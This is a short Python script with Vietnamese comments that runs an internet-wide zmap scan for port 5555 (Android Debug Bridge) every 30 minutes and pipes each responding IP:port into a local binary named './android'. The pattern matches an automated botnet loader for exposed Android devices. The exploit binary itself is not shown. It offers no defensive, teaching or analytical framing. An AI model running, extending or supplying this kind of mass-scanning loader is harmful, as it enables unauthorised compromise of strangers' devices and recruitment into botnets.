import subprocess
import time

while True:
    # Chạy lệnh
    command = "ulimit -n 999999; ulimit -u 999999; zmap -p 5555 -o- -q -v0 -T3 | awk '{print $1\":5555\"}' | ./android"
    subprocess.run(command, shell=True)

    # Chờ 30 phút (30 * 60 giây)
    time.sleep(30 * 60)